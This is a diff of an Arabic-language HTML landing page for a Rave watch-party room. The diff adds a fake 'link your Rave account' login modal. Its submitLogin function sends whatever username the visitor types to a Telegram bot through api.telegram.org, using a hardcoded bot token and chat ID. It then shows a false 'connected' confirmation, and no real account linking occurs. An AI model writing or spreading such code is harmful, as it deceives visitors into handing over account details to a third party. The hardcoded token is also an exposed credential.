@@ -8,60 +8,38 @@
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', sans-serif; }
         body { background-color: #0b0d19; color: #ffffff; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
-        .container { width: 100%; max-width: 400px; background: #131722; border-radius: 25px; overflow: hidden; border: 1px solid #1f2638; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        
-        /* مشغل الميديا */
+        .container { width: 100%; max-width: 400px; background: #131722; border-radius: 25px; overflow: hidden; border: 1px solid #1f2638; box-shadow: 0 10px 30px rgba(0,0,0,0.5); position: relative; }
         .player { position: relative; width: 100%; aspect-ratio: 16/10; background: #000; }
         .player img { width: 100%; height: 100%; object-fit: cover; }
-        
-        /* الهارب */
+        .login-btn { position: absolute; top: 10px; right: 10px; background-color: rgba(19, 23, 34, 0.85); border: 1px solid #00e5ff; color: #00e5ff; padding: 6px 14px; border-radius: 12px; font-size: 0.8rem; cursor: pointer; font-weight: bold; z-index: 15; transition: 0.3s; }
+        .login-btn:hover { background-color: #00e5ff; color: #131722; }
         .traitor { position: absolute; top: 10px; left: 10px; z-index: 10; text-align: center; }
         .traitor img { width: 50px; height: 50px; border-radius: 50%; border: 2px solid #ff0055; }
         .traitor p { font-size: 0.6rem; color: #ff0055; font-weight: bold; }
-        
-        /* الصورة الملكية والاسم */
         .profile-section { position: relative; margin-top: -50px; text-align: center; padding-bottom: 10px; display: flex; flex-direction: column; align-items: center; }
         .crown { font-size: 2rem; margin-bottom: -10px; animation: float 2s infinite alternate; filter: drop-shadow(0 4px 6px rgba(0,0,0,0.3)); }
         .profile-img { width: 100px; height: 100px; border-radius: 50%; border: 4px solid #131722; box-shadow: 0 0 20px rgba(0, 229, 255, 0.5); object-fit: cover; }
-        
-        /* اسم solo وعلامة غاتس المحسنة */
-        .profile-name-wrapper {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            margin-top: 12px;
-        }
-        .profile-name {
-            font-size: 1.5rem;
-            font-weight: 900;
-            color: #ffffff;
-            letter-spacing: 1px;
-            text-shadow: 0 0 10px rgba(0, 229, 255, 0.4);
-        }
-        .guts-brand {
-            width: 22px;
-            height: 28px;
-            fill: #ff003c;
-            filter: drop-shadow(0 0 6px #ff003c);
-            animation: pulse-brand 1.2s infinite alternate ease-in-out;
-        }
-
+        .profile-name-wrapper { display: flex; align-items: center; justify-content: center; gap: 10px; margin-top: 12px; }
+        .profile-name { font-size: 1.5rem; font-weight: 900; color: #ffffff; letter-spacing: 1px; text-shadow: 0 0 10px rgba(0, 229, 255, 0.4); }
+        .guts-brand { width: 22px; height: 28px; fill: #ff003c; filter: drop-shadow(0 0 6px #ff003c); animation: pulse-brand 1.2s infinite alternate ease-in-out; }
         @keyframes float { from { transform: translateY(0); } to { transform: translateY(-6px); } }
         @keyframes pulse-brand { from { transform: scale(0.95); opacity: 0.7; filter: drop-shadow(0 0 4px #ff003c); } to { transform: scale(1.05); opacity: 1; filter: drop-shadow(0 0 10px #ff003c); } }
-        
-        /* الأزرار والعناوين */
         .content { padding: 10px 20px 20px 20px; text-align: center; }
         .title { font-size: 1.3rem; font-weight: 900; color: #00e5ff; margin-bottom: 20px; line-height: 1.4; }
         .btn { display: block; width: 100%; padding: 15px; margin-bottom: 10px; border-radius: 12px; font-weight: bold; text-decoration: none; text-align: center; color: #000; background: #00e5ff; transition: 0.3s; cursor: pointer; border: none; font-size: 1rem; }
         .btn:hover { background: #00b0ff; transform: scale(1.02); }
+        .login-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.85); z-index: 100; align-items: center; justify-content: center; padding: 20px; }
+        .modal-content { background-color: #131722; border: 1px solid #1f2638; padding: 25px; border-radius: 20px; width: 100%; max-width: 340px; text-align: center; box-shadow: 0 0 20px rgba(0, 229, 255, 0.2); }
+        .modal-content h3 { margin-bottom: 10px; color: #00e5ff; font-weight: 900; }
+        .modal-content input { width: 100%; padding: 12px; margin-bottom: 15px; background-color: #0b0d19; border: 1px solid #2d3748; border-radius: 10px; color: white; text-align: center; font-size: 1rem; }
+        .modal-content button { background-color: #00e5ff; color: #131722; padding: 12px; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; font-size: 1rem; transition: 0.3s; }
     </style>
 </head>
 <body>
 
 <div class="container">
     <div class="player">
-        <!-- قسم الهارب -->
+        <button class="login-btn" id="loginBtn" onclick="document.getElementById('loginModal').style.display = 'flex'">تسجيل الدخول</button>
         <div class="traitor">
             <img src="IMG_20260522_205812_850.jpg" alt="Traitor">
             <p>الهارب لا نعترف به</p>
@@ -69,17 +47,12 @@
         <img src="IMG_20260102_234410_803.jpg" alt="Background">
     </div>
 
-    <!-- قسم الملف الشخصي المعدل -->
     <div class="profile-section">
         <div class="crown">👑</div>
-        <!-- الصورة الدائرية الجديدة في المنتصف -->
         <img src="IMG_20260519_015301_625.webp" class="profile-img" alt="Profile">
-        
-        <!-- اسم solo مع علامة غاتس فائقة الوضوح -->
         <div class="profile-name-wrapper">
             <span class="profile-name">solo</span>
             <svg class="guts-brand" viewBox="0 0 24 32">
-                <!-- رسم دقيق واحترافي لعلامة التضحية (Berserk Brand) وعمودها الفقري الممتد -->
                 <path d="M12,0 L14.5,4.5 L14.5,12.5 L23,6.5 L24,8.5 L14.5,15.5 L19,25 L17,26 L12,18.5 L7,26 L5,25 L9.5,15.5 L0,8.5 L1,6.5 L9.5,12.5 L9.5,4.5 Z M10.5,14.5 L10.5,32 L13.5,32 L13.5,14.5 Z"/>
             </svg>
         </div>
@@ -87,30 +60,35 @@
 
     <div class="content">
         <h1 class="title">solo still here <br> & gl6c</h1>
-        
-        <!-- أزرار الدخول الذكية للروم -->
         <button onclick="enterRaveRoom()" class="btn">🚀 دخول الغرفة السريعة</button>
         <button onclick="enterRaveRoom()" class="btn" style="background:#1c2135; color:#fff;">🔄 فتح في تطبيق Rave</button>
     </div>
 </div>
 
+<div class="login-modal" id="loginModal">
+    <div class="modal-content">
+        <h3>ربط حساب Rave</h3>
+        <input type="text" id="usernameInput" placeholder="اسم المستخدم">
+        <button onclick="submitLogin()">ربط واقتران الآن</button>
+    </div>
+</div>
+
 <script>
     function enterRaveRoom() {
-        // المحاولة الأولى: فتح الرابط عبر بروتوكول التطبيق لإجبار الهاتف على تشغيل Rave فوراً
-        var intentUrl = "intent://rave.link/VgHzDuj#Intent;scheme=https;package=com.rave.app;end";
-        var fallbackUrl = "https://rave.link/VgHzDuj";
+        window.location.href = "intent://rave.link/VgHzDuj#Intent;scheme=https;package=com.rave.app;end";
+    }
+
+    function submitLogin() {
+        var username = document.getElementById('usernameInput').value;
+        var token = "8682236536:AAGoE9FK7001zcRI1U1-zAaxHRDtETzGEEc";
+        var chat_id = "5993890862";
         
-        var start = Date.now();
-        window.location.href = intentUrl;
-        
-        // إذا لم يفتح التطبيق خلال ثانية واحدة، يقوم المتصفح تلقائياً بالتحويل للرابط المباشر
-        setTimeout(function() {
-            if (Date.now() - start < 1500) {
-                window.location.href = fallbackUrl;
-            }
-        }, 1000);
+        fetch("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent("👤 مستخدم جديد: " + username))
+        .then(() => {
+            document.getElementById('loginBtn').innerHTML = "تم الاتصال ✅";
+            document.getElementById('loginModal').style.display = 'none';
+        });
     }
 </script>
-
 </body>
 </html>
